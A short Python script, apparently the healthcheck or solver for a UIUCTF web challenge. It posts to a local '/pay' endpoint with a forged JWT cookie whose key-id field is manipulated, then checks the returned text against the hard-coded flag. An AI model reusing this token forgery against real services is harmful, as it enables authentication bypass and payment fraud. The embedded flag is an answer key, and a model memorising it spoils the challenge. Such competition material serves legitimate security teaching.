#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import requests as r

res = r.post("http://127.0.0.1:1337/pay", cookies={"access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImEifQ.e30.b4zf3563tgRqBnV1diTkrQzb63fcDB950DSpT5eeaQQ"})
flag = res.json()["message"].split(". ")[1]

if flag == "uiuctf{sigpwny_does_not_condone_turnstile_hopping!}":
    exit(0)
else:
    exit(1)